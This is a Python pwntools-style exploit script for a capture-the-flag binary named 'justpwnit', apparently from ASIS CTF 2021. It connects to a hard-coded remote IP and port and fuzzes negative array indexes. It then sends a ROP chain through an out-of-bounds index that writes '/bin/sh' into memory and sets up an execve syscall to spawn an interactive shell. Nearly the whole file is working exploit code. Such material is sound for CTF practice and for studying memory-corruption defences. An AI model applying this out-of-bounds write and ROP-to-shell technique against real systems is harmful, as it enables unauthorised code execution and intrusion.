#!/usr/bin/env python3.9
# -*- coding: utf-8 -*-
from rootkit import *

exe = context.binary = ELF('./justpwnit')

host = args.HOST or '168.119.108.148'
port = int(args.PORT or 11010)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
b *0x000000004013e9
continue
'''.format(**locals())

# -- Exploit goes here --
from time import sleep
io = start()

def send_data(idx, data):
    sla(b"Index: ", str(idx).encode('latin-1'))
    sla("Data: ", data)
# context.log_level = 'critical'

def fuzz():
    for i in range(0xff):
        p = auto_gdb("/home/init0/share/bkup/CTF/asis21/pwn_it/justpwnit/justpwnit")
        gdb_cmd("run")
        # sla("Index: ", str(i))
        p.sendlineafter(b"Index: ", str("-" + str(i)).encode('latin-1'))
        p.sendlineafter(b"Data: ", b"AAAAAAAA")
        sleep(0.5)
        print(p.recv(), i)
        p.close()
# r = Rootkit(io)
rop = b''
libc = False
IMAGE_BASE_0 = 0x0000000000400000 # 831ceb9879479ac43a71b0ddf7fac0b7a3f4815d06b70ee0c74b0a469974b5a0
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop += rebase_0(0x0000000000001001) # 0x0000000000401001: pop rax; ret; 
rop += b'/bin/sh\x00'
rop += rebase_0(0x0000000000001b0d) # 0x0000000000401b0d: pop rdi; ret; 
rop += rebase_0(0x000000000000c020)
rop += rebase_0(0x0000000000001ce7) # 0x0000000000401ce7: mov qword ptr [rdi], rax; ret;
rop += pop("rax", 0x3b) + static_rop()
send_data(-2, b"A"*8 + rop )


io.interactive()

